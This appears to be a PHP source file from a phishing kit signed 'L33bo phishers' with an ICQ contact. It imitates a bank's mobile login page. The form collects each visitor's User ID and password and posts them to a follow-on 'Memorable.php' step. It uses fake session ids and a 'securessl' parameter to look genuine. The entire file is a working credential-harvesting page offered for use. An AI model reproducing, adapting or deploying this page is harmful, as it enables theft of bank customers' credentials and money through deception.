<?php 
/*
L33bo phishers = ICQ: 695059760
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/enc.php";
?>
<!DOCTYPE html>
<html lang="en-gb">
<head>
<link href="assets/img/001.ico" type="image/x-icon" rel="icon" />
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Mobile &Beta;anking : Login</title>
<meta content="en-gb" http-equiv="content-language">
<link href="" media="handheld" rel="alternate">
<meta content="width=device-width" name="viewport">
<link href="assets/img/001.jpg" rel="apple-touch-icon" sizes="57x57">
<link href="assets/img/002.jpg" rel="apple-touch-icon" sizes="114x114">
<link href="assets/css/l33bo.css" rel="stylesheet" type="text/css">
<script src="assets/js/gen_validatorv4.js" type="text/javascript"></script>
<style>
.error_strings {
    margin: 0px;
    padding: 0px 20px 0px 30px;
    color: #db0000;
    font-size: 16px;
}
</style>
</head>
<body class="hasJS">
<div id="outer">
<div id="banner">
<p id="logo"><img src="assets/img/logo.gif"></p>
<p id="userstatusNGB"><img src="assets/img/001.png"></p>
<p class="cookiePolicy"><a href="#" id="lnkePrivacy" name="lnkePrivacy">Cookie
policy</a></p>
<div class="clearer"></div>
</div>
<div id="header">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="headerInner">
<h1>Welcome</h1>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="content">
<div class="login">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div class="loginInner">
<div class="msgTL">
<div class="msgTR">
<div class="msgBR">
<div class="msgBL">                           
<div id='frmLogin_user_errorloc' class="error_strings"></div>
</div>
</div>
</div>
</div>
</div>
<div class="loginFields">
<form id="frmLogin" name="frmLogin" method="post" action="Memorable.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" >
<div class="formField">
<span class="error_msg"></span>
<label for="frmLogin:lblUserID">User ID</label>
<input autocomplete="off" class="wide" id="user" class="required"
maxlength="30" name="user" type="text" value="">
</div>
<div class="formField"><label for="frmLogin:lblPassword">Password</label>
<input autocomplete="off" class="wide" id="pass" class="required"
maxlength="20" name="pass" type="password" value=""></div>
<div class="formField"><input class="checkbox" name="frmLogin:loginRemember"
type="checkbox"> <label class="checkboxLabel" for=
"frmLogin:loginRemember"><a href=
"#"
id="rememberMe" name="rememberMe">Remember my User ID</a></label></div>
<div class="actionsLogin">
<div class="divider">
<hr></div>
<input class="submitAction" id="frmLogin:lnkLogin1" name="frmLogin:lnkLogin1" type="submit" value="Continue">
</div>
</form>
<script src="assets/js/validatelogin.js" type="text/javascript"></script>
</div>
</div>
</div>
</div>
</div>
<div class="aside">
<p class="sideNote">
<a id="lnkForgotUserID" name="lnkForgotUserID" href="#">Forgotten your User ID?</a>
<br><br>
<a id="lnkForgotPwdMI" name="lnkForgotPwdMI" href="#">Forgotten your password?</a>
</p>
</div>
</div>
</div>
<div class="appBannerBG">
<div class="appBannerLink">
<center>
<p><a class="newwin" href="#"><img src="assets/img/004.jpg"></a></p>
</center>
</div>
</div>
<div class="clearer"></div>
<div id="footerLogin">
<div class="FootNav">
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="lnk1" name="lnk1">Register for Internet Banking</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="../Loginmb.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" id="lnk1" name="lnk1">Go to desktop site</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="lnk2" name="lnk2" >Help</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="lnk3" name="lnk3" >Security</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="lnk4" name="lnk4" >Contact us</a></p>
</div>
</div>
</div>
<div class="aside">
<p class="sideNote"><a href="#" id="lnkBookmark" name="lnkBookmark">Mobile Banking</a></p>
</div>
<div class="appBannerBG">
<div class="appBannerLink">
<p style="text-align: center"><a href="#"><img src="assets/img/003.jpg"></a></p>
</div>
</div>
<div class="clearer"></div>
<div>
<div class="footerLinksLogin"><a href="#" id="unauth:lnksecurity" name="unauth:lnksecurity" >Security</a>
<a class="footerLinksLast" href="#" id="unauth:lnkLegal" name="unauth:lnkLegal" >Legal</a></div>
</div>
</div>
</div>
</body>
</html>
<?php
/*
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
*/
?>